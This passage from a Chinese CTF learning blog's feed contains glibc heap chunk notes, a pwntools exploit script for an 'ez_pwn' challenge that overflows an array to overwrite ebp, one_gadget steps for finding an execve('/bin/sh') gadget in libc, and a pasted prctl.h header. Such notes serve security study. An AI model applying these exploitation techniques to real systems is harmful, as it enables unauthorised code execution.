chunk</p><ul><li>prev_size</li><li>size</li><li>fd : point to next chunk（包括 bin）<ul><li>这里指的是链表中的 next chunk，而非连续存储的 chunk</li></ul></li><li>bk : point to last chunk（包括 bin）<ul><li>这里指的是链表中的 last chunk，而非连续存储的 chunk</li></ul></li><li>fd_nextsize : point to next large chunk（不包含 bin）</li><li>bk_nextsize : point to last large chunk（不包含 bin）</li></ul></li><li><p>freed chunk</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/iM0use/img-hosting@master/20220518/image-20220518232149688.8u5iweyyjt4.webp" alt="image-20220518232149688"></p><ul><li>top chunk</li><li>第一次 malloc 时就会将 heap 切成两块 chunk，第一个 chunk 就是分配出去的 chunk，剩下的空间被视为 top chunk，之后要是分配空间不足时会有 top chunk 切出去<ul><li>prev_size</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        add(-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">13</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l()<span class="comment"># 覆盖ebp</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">path = <span class="string">'./ez_pwn'</span></span><br><span class="line">elf = ELF(path)</span><br><span class="line">io = elf.process()</span><br><span class="line">menu = <span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">b'input your choice:'</span>, <span class="built_in">str</span>(x).encode())</span><br><span class="line">io.sendlineafter(<span class="string">b'input the length of array:'</span>, <span class="string">b'-1'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'input num'</span>, <span class="built_in">str</span>(num).encode())</span><br><span class="line">    <span class="comment"># io.recv()</span></span><br><span class="line">    <span class="comment"># io.sendline(b'1')</span></span><br><span class="line">    <span class="comment"># io.recv()</span></span><br><span class="line">    <span class="comment"># io.sendline(b'-1')</span></span><br><span class="line">    <span class="comment"># menu(1)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsum</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getavg</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        add(-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    add(<span class="number">11</span>)</span><br><span class="line">    add(<span class="number">13</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line">    add(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">l()</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(15)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(15)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># add(-1)</span></span><br><span class="line"><span class="comment"># menu(1)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b'input num', b'-1')</span></span><br><span class="line"><span class="comment"># menu(1)</span></span><br><span class="line"><span class="comment"># io.sendlineafter(b'input num', b'-1')</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># _libc_main_got = 134529052</span></span><br><span class="line"><span class="comment"># add(_libc_main_got)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># getsum()</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()<span class="comment"># b *hackme + 202 main: 0xf7d43de0</span></span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><ul><li>strings</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh</span><br><span class="line">  18ac40 /bin/sh</span><br><span class="line">&amp;<span class="string">"/bin/sh"</span>: 0x18ac40</span><br></pre></td></tr></table></figure><ul><li>用 objdump 打开 libc.so.6</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d libc.so.6 | grep 18ac40 -A 7 -B 3</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">45575:call35a60 &lt;sigprocmask@@GLIBC_2.2.5&gt;</span><br><span class="line">4557a:movrax, QWORD PTR [rip+0x37b937]</span><br><span class="line">45581:leardi,[rip+0x1456b8]<span class="comment"># 18ac40</span></span><br><span class="line">45588:learsi,[rsp+0x30]</span><br><span class="line">4558d:movDWORD PTR [rip+0x37dee9],0x0</span><br><span class="line">45597:movDWORD PTR [rip+0x37dee3],0x0</span><br><span class="line">455a1:movrdx,QWORD PTR [rax]</span><br><span class="line">455a4:callcd760 &lt;execve@@GLIBC_2.2.5&gt;</span><br></pre></td></tr></table></figure><p>One Gadget: 0x4557a</p><p>execve(“/bin/sh”, rsp+0x30, environ);</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;一个写笔记的程序，下面是程序的一些功能。&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HITCON-train-echo1</title>
    <link href="http://im0use.github.io/2022/05/18/echo1/"/>
    <id>http://im0use.github.io/2022/05/18/echo1/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-29T01:03:53.204Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>开始时会让我们输入在栈上的name，限制长度，bss段的id会复制name。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;p&gt;开始时会让我们输入在栈上的name，限制长度，bss段的id会复制name。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>prctl</title>
    <link href="http://im0use.github.io/2022/05/18/prctl/"/>
    <id>http://im0use.github.io/2022/05/18/prctl/</id>
    <published>2022-05-18T14:43:16.000Z</published>
    <updated>2022-05-29T00:58:28.424Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Values to pass as first argument to prctl() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_PDEATHSIG  1  <span class="comment">/* Second arg is a signal */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_PDEATHSIG  2  <span class="comment">/* Second arg is a ptr to return the signal */</span></span></span><br><span class="line"><span class="comment">/* Get/set current-&gt;mm-&gt;dumpable */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_DUMPABLE   3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_DUMPABLE   4</span></span><br><span class="line"><span class="comment">/* Get/set unaligned access control bits (if meaningful) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_UNALIGN  5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_UNALIGN  6</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_UNALIGN_NOPRINT1<span class="comment">/* silently fix up unaligned user accesses */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_UNALIGN_SIGBUS2<span class="comment">/* generate SIGBUS on unaligned user access */</span></span></span><br><span class="line"><span class="comment">/* Get/set whether or not to drop capabilities on setuid() away from</span></span><br><span class="line"><span class="comment"> * uid 0 (as per security/commoncap.c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_KEEPCAPS   7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_KEEPCAPS   8</span></span><br><span class="line"><span class="comment">/* Get/set floating-point emulation control bits (if meaningful) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_FPEMU  9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_FPEMU 10</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FPEMU_NOPRINT1<span class="comment">/* silently emulate fp operations accesses */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FPEMU_SIGFPE2<span class="comment">/* don't emulate fp operations, send SIGFPE instead */</span></span></span><br><span class="line"><span class="comment">/* Get/set floating-point exception mode (if meaningful) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_FPEXC11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_FPEXC12</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_SW_ENABLE0x80<span class="comment">/* Use FPEXC for FP exception enables */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_DIV0x010000<span class="comment">/* floating point divide by zero */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_OVF0x020000<span class="comment">/* floating point overflow */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_UND0x040000<span class="comment">/* floating point underflow */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_RES0x080000<span class="comment">/* floating point inexact result */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_INV0x100000<span class="comment">/* floating point invalid operation */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_DISABLED0<span class="comment">/* FP exceptions disabled */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_NONRECOV1<span class="comment">/* async non-recoverable exc. mode */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_ASYNC2<span class="comment">/* async recoverable exception mode */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_EXC_PRECISE3<span class="comment">/* precise exception mode */</span></span></span><br><span class="line"><span class="comment">/* Get/set whether we use statistical process timing or accurate timestamp</span></span><br><span class="line"><span class="comment"> * based process timing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_TIMING   13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_TIMING   14</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_TIMING_STATISTICAL  0       <span class="comment">/* Normal, traditional,</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                                   statistical process timing */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_TIMING_TIMESTAMP    1       <span class="comment">/* Accurate timestamp based</span></span></span><br><span class="line"><span class="comment"><span class="meta">                                                   process timing */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NAME    15<span class="comment">/* Set process name */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NAME    16<span class="comment">/* Get process name */</span></span></span><br><span class="line"><span class="comment">/* Get/set process endian */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_ENDIAN19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_ENDIAN20</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_ENDIAN_BIG0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_ENDIAN_LITTLE1<span class="comment">/* True little endian mode */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_ENDIAN_PPC_LITTLE2<span class="comment">/* "PowerPC" pseudo little endian */</span></span></span><br><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP22</span></span><br><span class="line"><span class="comment">/* Get/set the capability bounding set (as per security/commoncap.c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_CAPBSET_READ 23</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_CAPBSET_DROP 24</span></span><br><span class="line"><span class="comment">/* Get/set the process' ability to use the timestamp counter instruction */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_TSC 25</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_TSC 26</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_TSC_ENABLE1<span class="comment">/* allow the use of the timestamp counter */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_TSC_SIGSEGV2<span class="comment">/* throw a SIGSEGV instead of reading the TSC */</span></span></span><br><span class="line"><span class="comment">/* Get/set securebits (as per security/commoncap.c) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SECUREBITS 27</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECUREBITS 28</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get/set the timerslack as used by poll/select/nanosleep</span></span><br><span class="line"><span class="comment"> * A value of 0 means "use default"</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_TIMERSLACK 29</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_TIMERSLACK 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_TASK_PERF_EVENTS_DISABLE31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_TASK_PERF_EVENTS_ENABLE32</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set early/late kill mode for hwpoison memory corruption.</span></span><br><span class="line"><span class="comment"> * This influences when the process gets killed on a memory corruption.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_MCE_KILL33</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_MCE_KILL_CLEAR   0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_MCE_KILL_SET     1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_MCE_KILL_LATE    0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_MCE_KILL_EARLY   1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_MCE_KILL_DEFAULT 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_MCE_KILL_GET 34</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Tune up process memory map specifics.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_MM35</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_START_CODE1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_END_CODE2</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_START_DATA3</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_END_DATA4</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_START_STACK5</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_START_BRK6</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_BRK7</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_ARG_START8</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_ARG_END9</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_ENV_START10</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_ENV_END11</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_AUXV12</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_EXE_FILE13</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_MAP14</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_MM_MAP_SIZE15</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This structure provides new memory descriptor</span></span><br><span class="line"><span class="comment"> * map which mostly modifies /proc/pid/stat[m]</span></span><br><span class="line"><span class="comment"> * output for a task. This mostly done in a</span></span><br><span class="line"><span class="comment"> * sake of checkpoint/restore functionality.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">prctl_mm_map</span> {</span></span><br><span class="line">__u64start_code;<span class="comment">/* code section bounds */</span></span><br><span class="line">__u64end_code;</span><br><span class="line">__u64start_data;<span class="comment">/* data section bounds */</span></span><br><span class="line">__u64end_data;</span><br><span class="line">__u64start_brk;<span class="comment">/* heap for brk() syscall */</span></span><br><span class="line">__u64brk;</span><br><span class="line">__u64start_stack;<span class="comment">/* stack starts at */</span></span><br><span class="line">__u64arg_start;<span class="comment">/* command line arguments bounds */</span></span><br><span class="line">__u64arg_end;</span><br><span class="line">__u64env_start;<span class="comment">/* environment variables bounds */</span></span><br><span class="line">__u64env_end;</span><br><span class="line">__u64*auxv;<span class="comment">/* auxiliary vector */</span></span><br><span class="line">__u32auxv_size;<span class="comment">/* vector size */</span></span><br><span class="line">__u32exe_fd;<span class="comment">/* /proc/$pid/exe link file */</span></span><br><span class="line">};</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set specific pid that is allowed to ptrace the current task.</span></span><br><span class="line"><span class="comment"> * A value of 0 mean "no process".</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_PTRACER 0x59616d61</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SET_PTRACER_ANY ((unsigned long)-1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_CHILD_SUBREAPER36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_CHILD_SUBREAPER37</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/prctl/no_new_privs.txt for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_TID_ADDRESS40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_THP_DISABLE41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_THP_DISABLE42</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Tell the kernel to start/stop helping userspace manage bounds tables.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_MPX_ENABLE_MANAGEMENT  43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_MPX_DISABLE_MANAGEMENT 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_FP_MODE45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_FP_MODE46</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_MODE_FR(1 &lt;&lt; 0)<span class="comment">/* 64b FP registers */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_FP_MODE_FRE(1 &lt;&lt; 1)<span class="comment">/* 32b compatibility */</span></span></span><br><span class="line"><span class="comment">/* Control the ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_CAP_AMBIENT47</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_CAP_AMBIENT_IS_SET1</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_CAP_AMBIENT_RAISE2</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_CAP_AMBIENT_LOWER3</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_CAP_AMBIENT_CLEAR_ALL4</span></span><br><span class="line"><span class="comment">/* arm64 Scalable Vector Extension controls */</span></span><br><span class="line"><span class="comment">/* Flag values must be kept in sync with ptrace NT_ARM_SVE interface */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SVE_SET_VL50<span class="comment">/* set task vector length */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SVE_SET_VL_ONEXEC(1 &lt;&lt; 18) <span class="comment">/* defer effect until exec */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SVE_GET_VL51<span class="comment">/* get task vector length */</span></span></span><br><span class="line"><span class="comment">/* Bits common to PR_SVE_SET_VL and PR_SVE_GET_VL */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SVE_VL_LEN_MASK0xffff</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SVE_VL_INHERIT(1 &lt;&lt; 17) <span class="comment">/* inherit across exec */</span></span></span><br><span class="line"><span class="comment">/* Per task speculation control */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_SPECULATION_CTRL52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SPECULATION_CTRL53</span></span><br><span class="line"><span class="comment">/* Speculation control variants */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_STORE_BYPASS0</span></span><br><span class="line"><span class="comment">/* Return and control values for PR_SET/GET_SPECULATION_CTRL */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_NOT_AFFECTED0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_PRCTL(1UL &lt;&lt; 0)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_ENABLE(1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_DISABLE(1UL &lt;&lt; 2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PR_SPEC_FORCE_DISABLE(1UL 